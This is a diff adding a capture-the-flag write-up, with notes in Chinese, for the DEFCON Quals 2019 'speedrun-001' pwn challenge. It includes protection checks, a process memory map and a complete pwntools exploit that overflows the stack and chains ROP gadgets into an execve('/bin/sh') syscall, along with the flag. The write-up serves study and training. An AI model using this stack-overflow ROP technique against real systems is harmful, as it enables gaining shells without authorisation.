@@ -1827,3 +1827,124 @@ interactive()
 
 Flag: `BKPCTF{what_is_2015_minus_7547}`
 
+## DEFCON Quals 2019 Speedrun1
+
+### Information
+
+ - Category: Pwn
+ - Points: 5
+
+### Description
+
+> The Fast and the Furious
+
+<Download name="speedrun-001" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/07-bof_static/dcquals19_speedrun1/speedrun-001" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file speedrun-001
+speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
+λ ~/ pwn checksec speedrun-001
+[*] '/home/cub3y0nd/speedrun-001'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+```plain-text
+Hello brave new challenger
+Any last words?
+no
+This will be the last thing that you say: no
+
+Alas, you had no luck today.
+```
+
+看保护知道开了 NX，那可以试试构造 ROP Chain。
+
+这里用典型的调用 `execve()` ROP。
+
+`/bin/sh` 的话我放在了程序可读写的一段内存里，比如 `006b6000` 就很合适，因为是私有地址，也不会影响程序运行。
+
+```plain-text
+λ ~/ ./speedrun-001 &
+[1] 21519
+Hello brave new challenger
+Any last words?
+[1]  + suspended (tty input)  ./speedrun-001
+λ ~/Projects/CTF/ cat /proc/21519/maps
+00400000-004b6000 r-xp 00000000 103:07 19662851                          /home/cub3y0nd/Projects/CTF/speedrun-001
+006b6000-006bc000 rw-p 000b6000 103:07 19662851                          /home/cub3y0nd/Projects/CTF/speedrun-001
+006bc000-006bd000 rw-p 00000000 00:00 0
+30bde000-30c01000 rw-p 00000000 00:00 0                                  [heap]
+758b8d187000-758b8d18b000 r--p 00000000 00:00 0                          [vvar]
+758b8d18b000-758b8d18d000 r-xp 00000000 00:00 0                          [vdso]
+7fff62991000-7fff629b2000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+λ ~/ fg
+[1]  + continued  ./speedrun-001
+zsh: alarm      ./speedrun-001
+```
+
+溢出点的话，直接 `cyclic 2000` 怼上去就有了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(
+    os='linux',
+    arch='amd64',
+    log_level='debug',
+    terminal='kitty',
+    binary=ELF('./speedrun-001')
+)
+
+target = process()
+
+recvline      = lambda : target.recvline()
+recvuntil     = lambda str : target.recvuntil(str)
+sendline      = lambda str : target.sendline(str)
+sendlineafter = lambda str1, str2 : target.sendlineafter(str1.encode(), str2.encode())
+interactive   = lambda : target.interactive()
+
+rop = ROP(context.binary)
+
+POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
+POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
+POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
+SYSCALL = rop.find_gadget(['syscall'])[0]
+BIN_SH = 0x68732f6e69622f
+
+rop.raw(b'A' * 0x408)
+rop.raw(POP_RAX)
+rop.raw(0x6b6000)
+rop.raw(POP_RDX)
+rop.raw(BIN_SH)
+# mov qword ptr [rax], rdx ; ret
+rop.raw(0x48d251)
+rop.raw(POP_RDI)
+rop.raw(0x6b6000)
+rop.raw(POP_RSI)
+rop.raw(0x0)
+rop.raw(POP_RDX)
+rop.raw(0x0)
+rop.raw(POP_RAX)
+rop.raw(0x3b)
+rop.raw(SYSCALL)
+
+sendline(rop.chain())
+interactive()
+```
+
+### Flag
+
+Flag: `OOO{Ask any powner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}`
+
